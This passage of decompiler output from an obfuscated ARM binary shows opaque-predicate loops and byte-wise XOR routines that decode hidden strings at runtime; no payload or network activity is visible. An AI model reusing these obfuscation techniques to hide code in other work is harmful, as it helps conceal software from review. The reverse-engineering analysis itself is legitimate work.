    uVar20 = *(uint *)(DAT_00021ccc + 0x21234);
    DataMemoryBarrier(0xb);
    *puVar31 = 1;
    uVar28 = uVar28 ^ uVar20;
    uVar32 = ((uVar28 ^ DAT_00021ab8) & DAT_00021abc) * (uVar32 ^ uVar32 + 2) +
             (uVar28 ^ DAT_00021ab4);
    uVar20 = (DAT_00021ac4 & ~uVar32 | uVar32 & DAT_00021ac0) ^ DAT_00021ac8 | uVar32 & DAT_00021acc
    ;
    uVar21 = uVar20 ^ DAT_00021ad0;
    uVar20 = uVar20 & DAT_00021ad4;
    uVar23 = DAT_00021aa0 ^ DAT_00021aa0 + 2;
    piVar33 = (int *)(puVar24 + -((uVar14 + 1 ^ uVar14) * 4 + 7 & 0xfffffff8));
    iVar27 = FUN_00026e04(uVar8,uVar11,piVar33);
    iVar12 = DAT_00021af0;
    uVar18 = DAT_00021aec;
    uVar28 = DAT_00021ae8;
    iVar34 = DAT_00021ae4;
    uVar32 = DAT_00021ae0;
    if (uVar23 * uVar20 - uVar21 <= DAT_00021ad8) break;
LAB_000212e8:
    uVar32 = DAT_00021aac;
    DataMemoryBarrier(0xb);
    *puVar31 = 1;
    puVar24 = (undefined *)((int)piVar33 - ((uVar32 ^ uVar32 + 1) * 4 + 7 & 0xfffffff8));
    FUN_00026e04(uVar8,uVar11);
  }
  do {
    iVar16 = FUN_00035060(*(uint *)(DAT_00021cd0 + 0x21348) ^ DAT_00021adc,
                          *(uint *)(DAT_00021cd4 + 0x21354) ^ uVar32);
    iVar17 = FUN_00035060(iVar16 * iVar34 & uVar28,uVar18);
    uVar21 = DAT_00021b08;
    uVar20 = DAT_00021b04;
    iVar16 = DAT_00021b00;
    uVar8 = DAT_00021afc;
    uVar14 = DAT_00021af8;
  } while (iVar17 == iVar12);
  do {
    uVar18 = FUN_00035060(*(uint *)(DAT_00021cd8 + 0x21394) ^ DAT_00021af4,
                          *(uint *)(DAT_00021cdc + 0x213a0) ^ uVar14);
    iVar12 = FUN_00035060(uVar18,uVar8);
    iVar34 = local_38;
    uVar18 = local_3c;
  } while (uVar21 < (iVar12 * iVar16 ^ uVar20));
  if (iVar27 != 0) {
    uVar14 = *(uint *)(DAT_00021ce0 + 0x2142c) ^ DAT_00021b0c;
    uVar28 = FUN_00035060(((*(uint *)(DAT_00021ce4 + 0x21438) ^ uVar14 ^ DAT_00021b10) & uVar14) +
                          DAT_00021b14,DAT_00021b18);
    uVar14 = DAT_00021b2c;
    iVar34 = DAT_00021b28;
    uVar32 = DAT_00021b24;
    if (DAT_00021b20 < (uVar28 | DAT_00021b1c)) {
      __errno();
      uVar14 = DAT_00021b2c;
      iVar34 = DAT_00021b28;
      uVar32 = DAT_00021b24;
    }
    do {
      uVar28 = *(uint *)(DAT_00021ce8 + 0x21488) ^ uVar32;
      uVar28 = ((*(uint *)(DAT_00021cec + 0x21494) ^ uVar28) & uVar28 & 0x1020000) * iVar34;
      puVar31 = (undefined4 *)__errno();
    } while (uVar14 <= uVar28 && uVar28 - uVar14 != 0);
    do {
      uVar14 = ((*(uint *)(DAT_00021cf4 + 0x214d4) ^ DAT_00021b38 |
                *(uint *)(DAT_00021cf0 + 0x214c0) ^ DAT_00021b34) +
                (*(uint *)(DAT_00021cf4 + 0x214d4) ^ DAT_00021b3c) +
                (DAT_00021b30 + 1 ^ DAT_00021b30) & DAT_00021b40) * DAT_00021b44;
    } while (DAT_00021b48 <= uVar14 && uVar14 - DAT_00021b48 != 0);
                    /* WARNING: Subroutine does not return */
    FUN_00027cf0((DAT_00021b4c | 1) ^ DAT_00021b4c,(int)&DAT_00021528 + DAT_00021cf8,local_30,
                 *puVar31);
  }
  iVar12 = *piVar33;
  if (((*(uint *)(DAT_00021d00 + 0x213e8) ^ DAT_00021b54) +
       (*(uint *)(DAT_00021cfc + 0x213d8) ^ DAT_00021b50) + DAT_00021b58 ^ DAT_00021b5c) <=
      DAT_00021b60) goto LAB_00021530;
  do {
    FUN_0002378c(iVar34,iVar12,uVar18,param_5);
LAB_00021530:
    uVar14 = ((*(uint *)(DAT_00021d08 + 0x21554) ^ DAT_00021b68) &
             (*(uint *)(DAT_00021d04 + 0x21544) ^ DAT_00021b64)) + DAT_00021b6c;
    uVar14 = ~((uVar14 | DAT_00021b70) & (~uVar14 | DAT_00021b74)) | DAT_00021b78;
    iVar27 = FUN_0002378c(iVar34,iVar12,uVar18,param_5);
  } while (uVar14 < DAT_00021b7c);
  if (iVar27 != 0) {
    iVar34 = *piVar33;
    do {
      uVar14 = ((*(uint *)(DAT_00021d10 + 0x21870) ^ 0x8a24) & 0x18a64 |
               (*(uint *)(DAT_00021d10 + 0x21870) ^ DAT_00021b8c) & DAT_00021b88) ^
               ((*(uint *)(DAT_00021d0c + 0x2185c) ^ 0xa60) & 0x18a64 |
               (*(uint *)(DAT_00021d0c + 0x2185c) ^ DAT_00021b84) & DAT_00021b88);
    } while ((((uVar14 & DAT_00021b94) + (uVar14 | DAT_00021b90)) -
             (DAT_00021b80 + 1 ^ DAT_00021b80)) + DAT_00021b98 < DAT_00021b9c);
    uVar32 = FUN_00035060((*(uint *)(DAT_00021d18 + 0x218f0) ^ DAT_00021ba4) &
                          (*(uint *)(DAT_00021d14 + 0x218e0) ^ DAT_00021ba0),DAT_00021ba8);
    uVar14 = DAT_00021bc8;
    iVar12 = DAT_00021bc4;
    uVar18 = DAT_00021bc0;
    if ((uVar32 | DAT_00021bac) * DAT_00021bb0 - DAT_00021bb4 == 0) {
      close(iVar34);
      uVar14 = DAT_00021bc8;
      iVar12 = DAT_00021bc4;
      uVar18 = DAT_00021bc0;
    }
    do {
      uVar32 = *(uint *)(DAT_00021d1c + 0x21940);
      uVar28 = *(uint *)(DAT_00021d20 + 0x21948);
      close(iVar34);
      iVar16 = FUN_00035060((uVar32 ^ DAT_00021bbc) & (uVar28 ^ DAT_00021bb8),uVar18);
    } while ((uint)(iVar16 + iVar12) < uVar14);
    uVar32 = ((*(uint *)(DAT_00021d28 + 0x21994) ^ DAT_00021bd0) &
              (*(uint *)(DAT_00021d24 + 0x21984) ^ DAT_00021bcc) & DAT_00021bd4 ^ DAT_00021bd8) *
             DAT_00021bdc;
    uVar14 = DAT_00021be8;
    if (DAT_00021be0 <= uVar32 && uVar32 - DAT_00021be0 != 0) {
      uVar14 = DAT_00021be4;
    }
                    /* WARNING: Subroutine does not return */
    FUN_00027cf0((uVar14 | 1) ^ uVar14,(int)&DAT_000219d8 + DAT_00021d2c,local_30,iVar27);
  }
  iVar12 = FUN_00035060(*(uint *)(DAT_00021d30 + 0x215e8) ^ DAT_00021bec,
                        *(uint *)(DAT_00021d34 + 0x215f8) ^ DAT_00021bf0);
  uVar14 = DAT_00021c20;
  uVar32 = DAT_00021c1c;
  uVar18 = DAT_00021c18;
  uVar28 = DAT_00021c14;
  uVar20 = DAT_00021c10;
  uVar21 = DAT_00021c0c;
  if (DAT_00021c04 <
      (((iVar12 + DAT_00021bf4) -
       ((DAT_00021bfc | 2) ^ DAT_00021bfc) * (iVar12 + DAT_00021bf4 & DAT_00021bf8)) + DAT_00021bf8
      & DAT_00021c00)) {
    *(uint *)(iVar34 + 4) = (DAT_00021c08 | 1) ^ DAT_00021c08;
    uVar14 = DAT_00021c20;
    uVar32 = DAT_00021c1c;
    uVar18 = DAT_00021c18;
    uVar28 = DAT_00021c14;
    uVar20 = DAT_00021c10;
    uVar21 = DAT_00021c0c;
  }
  do {
    *(uint *)(iVar34 + 4) = uVar21 ^ uVar21 + 1;
    uVar23 = FUN_00035060((*(uint *)(DAT_00021d3c + 0x21680) ^ uVar28) -
                          (*(uint *)(DAT_00021d38 + 0x21674) ^ uVar20),uVar18);
  } while ((uVar23 | uVar32) == uVar14);
  if (DAT_00021c24 == 0) {
    FUN_000245b8(iVar34);
  }
  uVar28 = DAT_00021c54;
  uVar32 = DAT_00021c3c;
  uVar14 = DAT_00021c34;
  uVar20 = DAT_00021c28 + 0x84000;
  uVar21 = DAT_00021c2c + 0x34c;
  do {
    uVar23 = *(uint *)(DAT_00021d40 + 0x216e0) ^ DAT_00021c38;
    uVar13 = uVar21 ^ *(uint *)(DAT_00021d44 + 0x21704) ^ DAT_00021c40;
    uVar25 = uVar20 ^ uVar13 ^ DAT_00021c44;
    uVar29 = ((uVar23 & uVar32 | (*(uint *)(DAT_00021d40 + 0x216e0) ^ DAT_00021c30) & uVar14) ^
              (uVar25 & uVar32 | uVar13 & uVar14) | ~(uVar23 | uVar25)) + DAT_00021c48 &
             DAT_00021c4c ^ DAT_00021c50;
    iVar27 = FUN_000245b8(iVar34);
    iVar12 = DAT_00021c98;
    uVar18 = DAT_00021c94;
    uVar10 = DAT_00021c90;
    uVar9 = DAT_00021c8c;
    uVar25 = DAT_00021c88;
    uVar13 = DAT_00021c80;
    uVar23 = DAT_00021c7c;
  } while (uVar29 < uVar28);
  if (iVar27 != 0) {
    uVar32 = ((*(uint *)(DAT_00021d4c + 0x21a18) ^ DAT_00021c5c) -
             (*(uint *)(DAT_00021d48 + 0x21a08) ^ DAT_00021c58)) + DAT_00021c60;
    uVar14 = DAT_00021c78;
    if (DAT_00021c70 <
        (uVar32 & DAT_00021c64) * ((DAT_00021c68 | 2) ^ DAT_00021c68) + (uVar32 ^ DAT_00021c64) +
        DAT_00021c6c) {
      uVar14 = DAT_00021c74;
    }
                    /* WARNING: Subroutine does not return */
    FUN_00027cf0((uVar14 | 1) ^ uVar14,(int)&DAT_00021a70 + DAT_00021d50,local_30,iVar27);
  }
  do {
    uVar14 = (*(uint *)(DAT_00021d58 + 0x217a0) ^ uVar25) +
             (*(uint *)(DAT_00021d54 + 0x21794) ^ DAT_00021c84);
    uVar14 = (uVar14 & uVar9) * (uVar13 + 2 ^ uVar13) + (uVar14 ^ uVar9);
    iVar16 = FUN_00035060((uVar14 - (uVar23 + 2 ^ uVar23) * (uVar14 & uVar10)) + uVar10,uVar18);
    uVar20 = DAT_00021cb0;
    iVar27 = DAT_00021cac;
    uVar28 = DAT_00021ca8;
    iVar34 = DAT_00021ca4;
    uVar32 = DAT_00021ca0;
    uVar14 = DAT_00021c9c;
  } while (iVar16 == iVar12);
  do {
    iVar12 = FUN_00035060(*(uint *)(DAT_00021d5c + 0x217f8) ^ uVar14,
                          *(uint *)(DAT_00021d60 + 0x21804) ^ uVar32);
  } while (uVar20 < (iVar12 + iVar34 & uVar28) + iVar27);
  if (**(int **)(DAT_00021d64 + 0x2182c) == local_2c) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ---- 00021d68  FUN_00021d68  size=4456

/* WARNING: Restarted to delay deadcode elimination for space: stack */

void FUN_00021d68(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  undefined4 uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  uint uVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  byte *pbVar16;
  uint uVar17;
  int *piVar18;
  byte *pbVar19;
  undefined4 *puVar20;
  byte *pbVar21;
  byte *pbVar22;
  
  uVar8 = FUN_00035060(((*(uint *)(DAT_00022bd8 + 0x21da4) ^ DAT_00022bdc) -
                       (*(uint *)(DAT_00022bd0 + 0x21d94) ^ DAT_00022bd4)) + DAT_00022be0,
                       DAT_00022be4);
  uVar9 = DAT_00022bf4;
  piVar18 = (int *)(DAT_00022bec + 0x21dd4);
  if ((uVar8 | DAT_00022be8) < DAT_00022bf0) goto LAB_00021e5c;
  while( true ) {
    uVar8 = ((*(uint *)(DAT_00022c04 + 0x21df8) ^ DAT_00022c0c) &
            (*(uint *)(DAT_00022bf8 + 0x21dec) ^ DAT_00022c08)) -
            ((*(uint *)(DAT_00022c04 + 0x21df8) ^ DAT_00022c00) &
            (*(uint *)(DAT_00022bf8 + 0x21dec) ^ DAT_00022bfc));
    uVar8 = FUN_00035060(uVar8 + (uVar9 ^ uVar9 + 1) + (~uVar8 | DAT_00022c10) + DAT_00022c14 |
                         DAT_00022c18,DAT_00022c1c);
    iVar7 = DAT_00022c28;
    iVar14 = DAT_00022c24;
    DataMemoryBarrier(0xb);
    if (uVar8 <= DAT_00022c20) break;
LAB_00021e5c:
    DataMemoryBarrier(0xb);
  }
  if (*piVar18 == 0) {
    pbVar19 = (byte *)(DAT_00022c24 + 0x21e88);
    pbVar16 = (byte *)(DAT_00022c28 + 0x21e90);
    uVar9 = ((*(uint *)(DAT_00022c38 + 0x21eb4) ^ DAT_00022eac) & DAT_00022ea4 |
            (*(uint *)(DAT_00022c38 + 0x21eb4) ^ DAT_00022ea8) & DAT_00022ea0) ^
            ((*(uint *)(DAT_00022c2c + 0x21e98) ^ DAT_00022c34) & DAT_00022ea4 |
            (*(uint *)(DAT_00022c2c + 0x21e98) ^ DAT_00022c30) & DAT_00022ea0);
    uVar9 = (uVar9 | DAT_00022eb0) * (uVar9 & DAT_00022eb0) +
            (DAT_00022eb0 & ~uVar9) * (uVar9 & DAT_00022eb4);
    iVar10 = FUN_00035060((uVar9 & DAT_00022eb8) * ((DAT_00022ebc | 2) ^ DAT_00022ebc) +
                          (uVar9 ^ DAT_00022eb8),DAT_00022ec0);
    iVar13 = DAT_00022ec8;
    iVar12 = DAT_00022ec4;
    pbVar22 = (byte *)(DAT_00022ec4 + 0x21f30);
    pbVar21 = (byte *)(DAT_00022ec8 + 0x21f34);
    if (iVar10 == DAT_00022ecc) goto LAB_000223dc;
    while( true ) {
      bVar1 = *pbVar22;
      *(byte *)(iVar14 + 0x21e8a) = *(byte *)(iVar12 + 0x21f32) ^ 0xb5;
      bVar2 = *(byte *)(iVar12 + 0x21f31);
      *(byte *)(iVar14 + 0x21e8c) = *(byte *)(iVar12 + 0x21f34) ^ 0x8a;
      bVar3 = *(byte *)(iVar12 + 0x21f33);
      *(byte *)(iVar14 + 0x21e8e) = *(byte *)(iVar12 + 0x21f36) ^ 0xe9;
      *pbVar19 = (~bVar1 & 0x11 | bVar1 & 0xee) ^ 7;
      *(byte *)(iVar14 + 0x21e89) = (~bVar2 | 0x74) & (bVar2 | 0x8b);
      *(byte *)(iVar14 + 0x21e8b) = ~(bVar3 & 0x57 | ~bVar3 & 0xa8);
      *(byte *)(iVar14 + 0x21e8d) =
           (~*(byte *)(iVar12 + 0x21f35) & 0xf0 | *(byte *)(iVar12 + 0x21f35) & 0xf) ^ 0x57;
      *(byte *)(iVar14 + 0x21e8f) =
           *(byte *)(iVar12 + 0x21f37) + (*(byte *)(iVar12 + 0x21f37) & 0x3d) * -2 + '=';
      uVar9 = *(uint *)(DAT_00022f6c + 0x21fe8);
      uVar8 = *(uint *)(DAT_00022f70 + 0x21ff0);
      bVar1 = *(byte *)(iVar12 + 0x21f39);
      bVar2 = *(byte *)(iVar12 + 0x21f3a);
      *(byte *)(iVar14 + 0x21e90) = *(byte *)(iVar12 + 0x21f38) ^ 0x9b;
      *(byte *)(iVar14 + 0x21e91) = bVar1 ^ 0x6f;
      *(byte *)(iVar14 + 0x21e92) = bVar2 ^ 0x61;
      bVar1 = *(byte *)(iVar12 + 0x21f3b);
      *(byte *)(iVar14 + 0x21e98) = *(byte *)(iVar12 + 0x21f40) ^ 0x13;
      bVar2 = *(byte *)(iVar12 + 0x21f45);
      *(byte *)(iVar14 + 0x21e94) =
           ~*(byte *)(iVar12 + 0x21f3c) & 0xa8 | *(byte *)(iVar12 + 0x21f3c) & 0x57;
      *(byte *)(iVar14 + 0x21e96) =
           ~*(byte *)(iVar12 + 0x21f3e) & 0xc9 | *(byte *)(iVar12 + 0x21f3e) & 0x36;
      *(byte *)(iVar14 + 0x21e97) =
           ~*(byte *)(iVar12 + 0x21f3f) & 0xeb | *(byte *)(iVar12 + 0x21f3f) & 0x14;
      bVar3 = *(byte *)(iVar12 + 0x21f44);
      *(byte *)(iVar14 + 0x21e93) = bVar1 + (bVar1 & 0x6b) * -2 + 'k';
      *(byte *)(iVar14 + 0x21e95) =
           (~*(byte *)(iVar12 + 0x21f3d) & 10 | *(byte *)(iVar12 + 0x21f3d) & 0xf5) ^ 0xef;
      bVar1 = *(byte *)(iVar12 + 0x21f43);
      *(byte *)(iVar14 + 0x21e99) =
           *(byte *)(iVar12 + 0x21f41) + (*(byte *)(iVar12 + 0x21f41) & 0x61) * -2 + -0x1f;
      *(byte *)(iVar14 + 0x21e9b) = bVar1 ^ 0xb;
      *(byte *)(iVar14 + 0x21e9c) = bVar3 ^ 0x97;
      *(byte *)(iVar14 + 0x21e9d) = bVar2 ^ 0x79;
      bVar1 = *(byte *)(iVar12 + 0x21f42);
      *(byte *)(iVar14 + 0x21ea1) = *(byte *)(iVar12 + 0x21f49) ^ 0xf3;
      *(byte *)(iVar14 + 0x21ea2) = *(byte *)(iVar12 + 0x21f4a) ^ 0x3e;
      *(byte *)(iVar14 + 0x21e9a) = (~bVar1 & 0xb9 | bVar1 & 0x46) ^ 0xa3;
      *(byte *)(iVar14 + 0x21e9e) =
           ~(*(byte *)(iVar12 + 0x21f46) & 0x2a | ~*(byte *)(iVar12 + 0x21f46) & 0xd5);
      *(byte *)(iVar14 + 0x21e9f) =
           *(byte *)(iVar12 + 0x21f47) + (*(byte *)(iVar12 + 0x21f47) & 0x1f) * -2 + -0x61;
      *(byte *)(iVar14 + 0x21ea0) =
           *(byte *)(iVar12 + 0x21f48) + (*(byte *)(iVar12 + 0x21f48) & 0x29) * -2 + ')';
      *(byte *)(iVar14 + 0x21ea3) = *(byte *)(iVar12 + 0x21f4b) ^ 0xc3;
      *(byte *)(iVar14 + 0x21ea4) = *(byte *)(iVar12 + 0x21f4c) ^ 0x18;
      *(byte *)(iVar14 + 0x21ea5) =
           (~*(byte *)(iVar12 + 0x21f4d) & 0xac | *(byte *)(iVar12 + 0x21f4d) & 0x53) ^ 0x75;
      *(byte *)(iVar14 + 0x21ea6) =
           (~*(byte *)(iVar12 + 0x21f4e) & 0x8c | *(byte *)(iVar12 + 0x21f4e) & 0x73) ^ 0xc0;
      *(byte *)(iVar14 + 0x21ea7) = *(byte *)(iVar12 + 0x21f4f) ^ 0x2c;
      *(byte *)(iVar14 + 0x21ea8) = *(byte *)(iVar12 + 0x21f50) ^ 0x3c;
      *(byte *)(iVar14 + 0x21ea9) =
           *(byte *)(iVar12 + 0x21f51) + (*(byte *)(iVar12 + 0x21f51) & 0x3b) * -2 + -0x45;
      *pbVar16 = *pbVar21 ^ 0xf1;
      *(byte *)(iVar7 + 0x21e91) =
           (~*(byte *)(iVar13 + 0x21f35) | 0x78) & (*(byte *)(iVar13 + 0x21f35) | 0x87);
      *(byte *)(iVar7 + 0x21e92) = *(byte *)(iVar13 + 0x21f36) ^ 0xea;
      *(byte *)(iVar7 + 0x21e93) = *(byte *)(iVar13 + 0x21f37) ^ 0x61;
      *(byte *)(iVar7 + 0x21e94) = *(byte *)(iVar13 + 0x21f38) ^ 2;
      *(byte *)(iVar7 + 0x21e95) = *(byte *)(iVar13 + 0x21f39) ^ 0xb7;
      *(byte *)(iVar7 + 0x21e96) =
           (~*(byte *)(iVar13 + 0x21f3a) & 0xfe | *(byte *)(iVar13 + 0x21f3a) & 1) ^ 0x57;
      *(byte *)(iVar7 + 0x21e97) =
           *(byte *)(iVar13 + 0x21f3b) + (*(byte *)(iVar13 + 0x21f3b) & 0x56) * -2 + 'V';
      *(byte *)(iVar7 + 0x21e98) = *(byte *)(iVar13 + 0x21f3c) ^ 0xc4;
      *(byte *)(iVar7 + 0x21e99) = *(byte *)(iVar13 + 0x21f3d) ^ 0x1d;
      *(byte *)(iVar7 + 0x21e9a) = *(byte *)(iVar13 + 0x21f3e) ^ 0x9a;
      *(byte *)(iVar7 + 0x21e9b) = *(byte *)(iVar13 + 0x21f3f) ^ 0xda;
      *(byte *)(iVar7 + 0x21e9c) =
           ~*(byte *)(iVar13 + 0x21f40) & 0x2c | *(byte *)(iVar13 + 0x21f40) & 0xd3;
      *(byte *)(iVar7 + 0x21e9d) = *(byte *)(iVar13 + 0x21f41) ^ 0x24;
      *(byte *)(iVar7 + 0x21e9e) =
           *(byte *)(iVar13 + 0x21f42) + (*(byte *)(iVar13 + 0x21f42) & 0x7c) * -2 + -4;
      *(byte *)(iVar7 + 0x21e9f) = *(byte *)(iVar13 + 0x21f43) ^ 0x1b;
      *(byte *)(iVar7 + 0x21ea0) =
           ~((*(byte *)(iVar13 + 0x21f44) | 0x67) & (~*(byte *)(iVar13 + 0x21f44) | 0x98));
      *(byte *)(iVar7 + 0x21ea1) = *(byte *)(iVar13 + 0x21f45) ^ 0x83;
      *(byte *)(iVar7 + 0x21ea2) =
           *(byte *)(iVar13 + 0x21f46) + (*(byte *)(iVar13 + 0x21f46) & 0x54) * -2 + 'T';
      *(byte *)(iVar7 + 0x21ea3) = *(byte *)(iVar13 + 0x21f47) ^ 0x14;
      *(byte *)(iVar7 + 0x21ea4) =
           ~*(byte *)(iVar13 + 0x21f48) & 0x7a | *(byte *)(iVar13 + 0x21f48) & 0x85;
      *(byte *)(iVar7 + 0x21ea5) = *(byte *)(iVar13 + 0x21f49) ^ 0x75;
      *(byte *)(iVar7 + 0x21ea6) =
           ~*(byte *)(iVar13 + 0x21f4a) & 0x80 | *(byte *)(iVar13 + 0x21f4a) & 0x7f;
      *(byte *)(iVar7 + 0x21ea7) = *(byte *)(iVar13 + 0x21f4b) ^ 0x34;
      *(byte *)(iVar7 + 0x21ea8) = *(byte *)(iVar13 + 0x21f4c) ^ 0x4f;
      *(byte *)(iVar7 + 0x21ea9) =
           *(byte *)(iVar13 + 0x21f4d) + (*(byte *)(iVar13 + 0x21f4d) & 0x2e) * -2 + '.';
      *(byte *)(iVar7 + 0x21eaa) = *(byte *)(iVar13 + 0x21f4e) ^ 0x8f;
      *(byte *)(iVar7 + 0x21eab) =
           ~((*(byte *)(iVar13 + 0x21f4f) | 0xc5) & (~*(byte *)(iVar13 + 0x21f4f) | 0x3a));
      *(byte *)(iVar7 + 0x21eac) = *(byte *)(iVar13 + 0x21f50) ^ 0x2c;
      *(byte *)(iVar7 + 0x21ead) = *(byte *)(iVar13 + 0x21f51) ^ 0xca;
      uVar9 = FUN_00035060((uVar9 ^ DAT_00022f78) * (uVar8 ^ DAT_00022f74),DAT_00022f7c);
      uVar9 = FUN_00035060(uVar9 | DAT_00022f80,DAT_00022f84);
      if (uVar9 <= DAT_00022f88) break;
LAB_000223dc:
      bVar1 = *pbVar22;
      *(byte *)(iVar14 + 0x21e8b) = *(byte *)(iVar12 + 0x21f33) ^ 0x57;
      bVar2 = *(byte *)(iVar12 + 0x21f31);
      *(byte *)(iVar14 + 0x21e8e) = *(byte *)(iVar12 + 0x21f36) ^ 0xe9;
      bVar3 = *(byte *)(iVar12 + 0x21f32);
      bVar4 = *(byte *)(iVar12 + 0x21f3d);
      *pbVar19 = bVar1 + (bVar1 & 0x16) * -2 + 0x16;
      *(byte *)(iVar14 + 0x21e89) = ~(bVar2 & 0x8b | ~bVar2 & 0x74);
      bVar1 = *(byte *)(iVar12 + 0x21f3c);
      *(byte *)(iVar14 + 0x21e8a) = ~(bVar3 & 0xb5 | ~bVar3 & 0x4a);
      *(byte *)(iVar14 + 0x21e8c) =
           *(byte *)(iVar12 + 0x21f34) + (*(byte *)(iVar12 + 0x21f34) & 10) * -2 + -0x76;
      *(byte *)(iVar14 + 0x21e8d) =
           (~*(byte *)(iVar12 + 0x21f35) & 0xd6 | *(byte *)(iVar12 + 0x21f35) & 0x29) ^ 0x71;
      *(byte *)(iVar14 + 0x21e8f) =
           (~*(byte *)(iVar12 + 0x21f37) & 0x26 | *(byte *)(iVar12 + 0x21f37) & 0xd9) ^ 0x1b;
      bVar2 = *(byte *)(iVar12 + 0x21f3b);
      *(byte *)(iVar14 + 0x21e90) =
           (~*(byte *)(iVar12 + 0x21f38) & 0x25 | *(byte *)(iVar12 + 0x21f38) & 0xda) ^ 0xbe;
      *(byte *)(iVar14 + 0x21e91) = *(byte *)(iVar12 + 0x21f39) ^ 0x6f;
      *(byte *)(iVar14 + 0x21e92) = *(byte *)(iVar12 + 0x21f3a) ^ 0x61;
      *(byte *)(iVar14 + 0x21e93) = bVar2 ^ 0x6b;
      *(byte *)(iVar14 + 0x21e95) = bVar4 ^ 0xe5;
      bVar2 = *(byte *)(iVar12 + 0x21f46);
      *(byte *)(iVar14 + 0x21e96) = *(byte *)(iVar12 + 0x21f3e) ^ 0xc9;
      *(byte *)(iVar14 + 0x21e98) = *(byte *)(iVar12 + 0x21f40) ^ 0x13;
      *(byte *)(iVar14 + 0x21e97) =
           ~*(byte *)(iVar12 + 0x21f3f) & 0xeb | *(byte *)(iVar12 + 0x21f3f) & 0x14;
      bVar3 = *(byte *)(iVar12 + 0x21f45);
      *(byte *)(iVar14 + 0x21e94) = bVar1 + (bVar1 & 0x28) * -2 + -0x58;
      *(byte *)(iVar14 + 0x21e99) =
           (~*(byte *)(iVar12 + 0x21f41) & 0xd2 | *(byte *)(iVar12 + 0x21f41) & 0x2d) ^ 0x33;
      bVar1 = *(byte *)(iVar12 + 0x21f44);
      *(byte *)(iVar14 + 0x21e9a) =
           *(byte *)(iVar12 + 0x21f42) + (*(byte *)(iVar12 + 0x21f42) & 0x1a) * -2 + '\x1a';
      *(byte *)(iVar14 + 0x21e9c) = bVar1 ^ 0x97;
      *(byte *)(iVar14 + 0x21e9e) = bVar2 ^ 0x2a;
      bVar1 = *(byte *)(iVar12 + 0x21f43);
      *(byte *)(iVar14 + 0x21e9f) = *(byte *)(iVar12 + 0x21f47) ^ 0x9f;
      *(byte *)(iVar14 + 0x21ea0) = *(byte *)(iVar12 + 0x21f48) ^ 0x29;
      *(byte *)(iVar14 + 0x21ea1) = *(byte *)(iVar12 + 0x21f49) ^ 0xf3;
      *(byte *)(iVar14 + 0x21ea2) = *(byte *)(iVar12 + 0x21f4a) ^ 0x3e;
      *(byte *)(iVar14 + 0x21ea3) = *(byte *)(iVar12 + 0x21f4b) ^ 0xc3;
      *(byte *)(iVar14 + 0x21e9d) = ~bVar3 & 0x79 | bVar3 & 0x86;
      *(byte *)(iVar14 + 0x21e9b) = ~(bVar1 & 0xb | ~bVar1 & 0xf4);
      *(byte *)(iVar14 + 0x21ea4) =
           (~*(byte *)(iVar12 + 0x21f4c) | 0xe7) & (*(byte *)(iVar12 + 0x21f4c) | 0x18);
      *(byte *)(iVar14 + 0x21ea5) = *(byte *)(iVar12 + 0x21f4d) ^ 0xd9;
      *(byte *)(iVar14 + 0x21ea6) =
           ~(*(byte *)(iVar12 + 0x21f4e) & 0x4c | ~*(byte *)(iVar12 + 0x21f4e) & 0xb3);
      *(byte *)(iVar14 + 0x21ea7) = *(byte *)(iVar12 + 0x21f4f) ^ 0x2c;
      *(byte *)(iVar14 + 0x21ea8) = *(byte *)(iVar12 + 0x21f50) ^ 0x3c;
      *(byte *)(iVar14 + 0x21ea9) = *(byte *)(iVar12 + 0x21f51) ^ 0xbb;
      bVar1 = *pbVar21;
      *pbVar16 = ~bVar1 & 0xf1 | bVar1 & 0xe;
      *(byte *)(iVar7 + 0x21e91) = *(byte *)(iVar13 + 0x21f35) ^ 0x87;
      *(byte *)(iVar7 + 0x21e92) =
           ~*(byte *)(iVar13 + 0x21f36) & 0xea | *(byte *)(iVar13 + 0x21f36) & 0x15;
      *(byte *)(iVar7 + 0x21e93) =
           *(byte *)(iVar13 + 0x21f37) + (*(byte *)(iVar13 + 0x21f37) & 0x61) * -2 + 'a';
      *(byte *)(iVar7 + 0x21e94) = *(byte *)(iVar13 + 0x21f38) ^ 2;
      *(byte *)(iVar7 + 0x21e95) = *(byte *)(iVar13 + 0x21f39) ^ 0xb7;
      *(byte *)(iVar7 + 0x21e96) =
           ~((*(byte *)(iVar13 + 0x21f3a) | 0x56) & (~*(byte *)(iVar13 + 0x21f3a) | 0xa9));
      *(byte *)(iVar7 + 0x21e97) = *(byte *)(iVar13 + 0x21f3b) ^ 0x56;
      *(byte *)(iVar7 + 0x21e98) =
           ~(*(byte *)(iVar13 + 0x21f3c) & 0xc4 | ~*(byte *)(iVar13 + 0x21f3c) & 0x3b);
      *(byte *)(iVar7 + 0x21e99) = *(byte *)(iVar13 + 0x21f3d) ^ 0x1d;
      *(byte *)(iVar7 + 0x21e9a) = *(byte *)(iVar13 + 0x21f3e) ^ 0x9a;
      *(byte *)(iVar7 + 0x21e9b) = *(byte *)(iVar13 + 0x21f3f) ^ 0xda;
      *(byte *)(iVar7 + 0x21e9c) = *(byte *)(iVar13 + 0x21f40) ^ 0x2c;
      *(byte *)(iVar7 + 0x21e9d) = *(byte *)(iVar13 + 0x21f41) ^ 0x24;
      *(byte *)(iVar7 + 0x21e9e) =
           (~*(byte *)(iVar13 + 0x21f42) | 3) & (*(byte *)(iVar13 + 0x21f42) | 0xfc);
      *(byte *)(iVar7 + 0x21e9f) =
           ~((*(byte *)(iVar13 + 0x21f43) | 0xe4) & (~*(byte *)(iVar13 + 0x21f43) | 0x1b));
      *(byte *)(iVar7 + 0x21ea0) = *(byte *)(iVar13 + 0x21f44) ^ 0x98;
      *(byte *)(iVar7 + 0x21ea1) =
           ~((*(byte *)(iVar13 + 0x21f45) | 0x7c) & (~*(byte *)(iVar13 + 0x21f45) | 0x83));
      *(byte *)(iVar7 + 0x21ea2) = *(byte *)(iVar13 + 0x21f46) ^ 0x54;
      *(byte *)(iVar7 + 0x21ea3) =
           ~*(byte *)(iVar13 + 0x21f47) & 0x14 | *(byte *)(iVar13 + 0x21f47) & 0xeb;
      *(byte *)(iVar7 + 0x21ea4) = *(byte *)(iVar13 + 0x21f48) ^ 0x7a;
      *(byte *)(iVar7 + 0x21ea5) =
